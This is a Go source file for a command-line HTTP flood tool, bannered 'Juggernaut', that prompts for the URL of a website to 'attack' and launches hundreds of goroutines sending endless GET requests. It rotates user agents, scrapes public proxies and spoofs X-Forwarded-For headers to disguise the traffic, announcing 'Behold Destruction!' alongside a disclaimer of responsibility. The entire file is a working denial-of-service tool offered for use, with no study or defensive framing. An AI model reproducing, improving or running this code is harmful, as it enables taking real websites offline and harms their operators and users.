package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"strings"

	// "net/http/httputil"
	"os"
	"strconv"
	"time"
)

var colorReset = string("\033[0m")
var colorRed = string("\033[31m")
var colorGreen = string("\033[32m")
var colorYellow = string("\033[33m")
var colorBlue = string("\033[34m")
var colorPurple = string("\033[35m")
var colorCyan = string("\033[36m")
var colorWhite = string("\033[37m")
var bold = string("\033[1m")
var notbold = string("\033[0m")

var agents []string = []string{}
var http_proxies []string = []string{}
var bannercolors []string = []string{colorRed, colorGreen, colorPurple, colorBlue, colorCyan}
var counter int = 0
var Url, host string

var banner = `
     ██╗ ██╗   ██╗  ██████╗   ██████╗  ███████╗ ██████╗  ███╗   ██╗  █████╗  ██╗   ██╗ ████████╗
     ██║ ██║   ██║ ██╔════╝  ██╔════╝  ██╔════╝ ██╔══██╗ ████╗  ██║ ██╔══██╗ ██║   ██║ ╚══██╔══╝
     ██║ ██║   ██║ ██║  ███╗ ██║  ███╗ █████╗   ██████╔╝ ██╔██╗ ██║ ███████║ ██║   ██║    ██║   
██   ██║ ██║   ██║ ██║   ██║ ██║   ██║ ██╔══╝   ██╔══██╗ ██║╚██╗██║ ██╔══██║ ██║   ██║    ██║   
╚█████╔╝ ╚██████╔╝ ╚██████╔╝ ╚██████╔╝ ███████╗ ██║  ██║ ██║ ╚████║ ██║  ██║ ╚██████╔╝    ██║   
 ╚════╝   ╚═════╝   ╚═════╝   ╚═════╝  ╚══════╝ ╚═╝  ╚═╝ ╚═╝  ╚═══╝ ╚═╝  ╚═╝  ╚═════╝     ╚═╝   

`

func load_agents() {
	file, err := os.Open("agents.txt")

	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		agents = append(agents, str)
	}
}

func load_proxies() {
	proxy_client := &http.Client{}
	req, _ := http.NewRequest("GET", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", nil)
	resp, err := proxy_client.Do(req)

	if err != nil {
		fmt.Println(err)
	}

	bodybytes, err := io.ReadAll(resp.Body)

	if err != nil {
		fmt.Println(err)
	}
	body := string(bodybytes)

	sc := bufio.NewScanner(strings.NewReader(body))
	for sc.Scan() {
		http_proxies = append(http_proxies, sc.Text())
	}
}

func send_request_without_proxy() {

	for true {
		rand.Seed(time.Now().Unix())
		random_agent := rand.Int() % len(agents)
		client := &http.Client{}
		req, _ := http.NewRequest("GET", Url, nil)
		// if err != nil {fmt.Println("error occured here")}
		req.Host = host
		req.Header.Set("User-Agent", agents[random_agent])
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
		req.Header.Set("Accept-Language", "en-us")
		req.Header.Set("Accept-Encoding", "gzip, deflate")
		req.Header.Set("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
		req.Header.Set("Connection", "Keep-Alive")
		req.Header.Set("Cache-Control", "no-cache")
		req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(120-110)+110))
		req.Header.Set("Upgrade-Insecure-Requests", "1")
		_, err := client.Do(req)

		if err != nil {
			fmt.Println(err)
			continue
		}

		counter++

		// reqDump, _ := httputil.DumpRequestOut(req, true)
		// fmt.Println(string(reqDump))
	}
}

func send_request_with_proxy() {

	for true {
		rand.Seed(time.Now().Unix())
		random_agent := rand.Int() % len(agents)
		random_proxy_index := rand.Int() % len(http_proxies)
		random_proxy := "http://" + http_proxies[random_proxy_index]
		x_forwarded_ip := strings.Split(http_proxies[random_proxy_index], ":")
		// proxyurl, _ := url.Parse(random_proxy)
		os.Setenv("HTTP_PROXY", random_proxy)
		// client := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxyurl)}}
		client := &http.Client{}
		req, _ := http.NewRequest("GET", Url, nil)
		// if err != nil {fmt.Println("error occured here")}
		req.Host = host
		req.Header.Set("User-Agent", agents[random_agent])
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
		req.Header.Set("Accept-Language", "en-us")
		req.Header.Set("Accept-Encoding", "gzip, deflate")
		req.Header.Set("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
		req.Header.Set("Connection", "Keep-Alive")
		req.Header.Set("Cache-Control", "no-cache")
		req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(120-110)+110))
		req.Header.Set("Upgrade-Insecure-Requests", "1")
		req.Header.Set("X-Forwarded-For", x_forwarded_ip[0])
		_, err := client.Do(req)

		if err != nil {
			continue
		}
		counter++

		// reqDump, _ := httputil.DumpRequestOut(req, true)
		// fmt.Println(string(reqDump))
	}
}

func main() {

	rand.Seed(time.Now().Unix())
	random_color := rand.Int() % len(bannercolors)
	var go_num int
	var use_proxies string

	fmt.Printf("%s%s%s", bannercolors[random_color], banner, colorReset)
	fmt.Printf("%sNote: The request counter may not work properly on some websites\n      Proxies do not work, YOUR ORIGINAL IP WILL BE USED. but enabling them will create some obfuscation%s\n\n", colorYellow, colorWhite)
	fmt.Printf("%s%sWARNING: I AM NOT RESPONSIBLE FOR YOUR ACTS%s%s\n\n", colorRed, bold, notbold, colorReset)

	load_agents()
	fmt.Printf("%sUser Agents loaded!%s\n\n", colorGreen, colorReset)
	load_proxies()
	fmt.Printf("%sProxies Scrapped!%s\n\n", colorGreen, colorReset)

	fmt.Print("Enter the url of website you want to attack: ")
	fmt.Scanln(&Url)

	host = Url
	if strings.Contains(host, "https") {

		if strings.Contains(host, "www.") {
			host = strings.ReplaceAll(host, "https://", "")
		} else {
			host = strings.ReplaceAll(host, "https://", "www.")
		}
	} else if strings.Contains(host, "http") {
		if strings.Contains(host, "www.") {
			host = strings.ReplaceAll(host, "http://", "")
		} else {
			host = strings.ReplaceAll(host, "http://", "www.")
		}
	} else {
		fmt.Printf("%sA url with https or http was required!%s", colorRed, colorReset)
		os.Exit(0)
	}

	fmt.Printf("\r%sValidating url...%s", colorBlue, colorReset)

	client := &http.Client{}
	req, _ := http.NewRequest("GET", Url, nil)
	_, err := client.Do(req)

	if err != nil {
		fmt.Printf("\r%sEither this url does not exist or the target refused to connect%s", colorRed, colorReset)
		os.Exit(0)
	} else {
		fmt.Printf("\r%sThe url is valid%s", colorGreen, colorWhite)
	}

	fmt.Print("\nEnter number of goroutines(default - 750): ")
	fmt.Scanln(&go_num)

	if go_num < 0 {
		fmt.Printf("%sgoroutines cannot be less than 1!%s", colorRed, colorReset)
		os.Exit(0)
	} else if go_num == 0 {
		go_num = 750
	}

	fmt.Print("Do you want to use proxies(n/Y): ")
	fmt.Scanln(&use_proxies)

	if use_proxies == "n" || use_proxies == "N" {
		for i := 0; i <= go_num; i++ {
			go send_request_without_proxy()
		}
		fmt.Printf("\n%sAttack Started without proxies, Behold Destruction!%s", colorCyan, colorWhite)
		fmt.Println("\n")
	} else {
		for i := 0; i <= go_num; i++ {
			go send_request_with_proxy()
		}
		fmt.Printf("\n%sAttack Started with proxies, Behold Destruction!%s", colorCyan, colorWhite)
		fmt.Println("\n")
	}

	for true {
		fmt.Printf("\r%s%d%s requests sent%s", colorBlue, counter, colorGreen, colorReset)
		time.Sleep(time.Second * 1)
	}
}
